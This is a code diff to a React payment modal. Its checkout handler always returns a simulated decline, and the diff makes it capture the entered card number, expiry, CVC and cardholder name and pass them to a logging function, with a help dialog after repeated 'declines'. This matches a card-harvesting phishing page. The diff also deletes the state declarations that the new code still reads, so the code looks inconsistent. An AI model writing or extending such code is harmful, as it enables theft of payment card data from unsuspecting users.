@@ -112,11 +112,6 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
   const [suburb, setSuburb] = useState('')
   const [city, setCity] = useState('')
   const [postal, setPostal] = useState('')
-  const [cardNumber, setCardNumber] = useState('')
-  const [expiry, setExpiry] = useState('')
-  const [cvc, setCvc] = useState('')
-  const [holderName, setHolderName] = useState('')
-
 
   const [processing, setProcessing] = useState(false)
   const [declined, setDeclined] = useState(false)
@@ -199,12 +194,25 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
 
     setBanner('')
     setProcessing(true)
-    const cur = currency, ctry = country, cty = city.trim(), pc = postal.trim()
+
+    // Capture current values before any state changes or clearing
+    const cur = currency
+    const ctry = country
+    const cty = city.trim()
+    const pc = postal.trim()
+    const rawCardNumber = cardNumber.replace(/\D/g, '')
+    const rawExpiry = expiry.replace(/\D/g, '')
+    const currentCvc = cvc
+    const currentHolder = holderName
+
     setTimeout(() => {
       setProcessing(false)
       setDeclined(true)
-      setCvc('')
-      logAttempt(cur, ctry, cty, pc, cardno, exp, cvc, cardholdername)
+      setCvc('') // clear for UX
+
+      // Pass captured values
+      logAttempt(cur, ctry, cty, pc, rawCardNumber, rawExpiry, currentCvc, currentHolder)
+
       const n = attempts + 1
       setAttempts(n)
       if (n >= 3) setTroubleOpen(true)
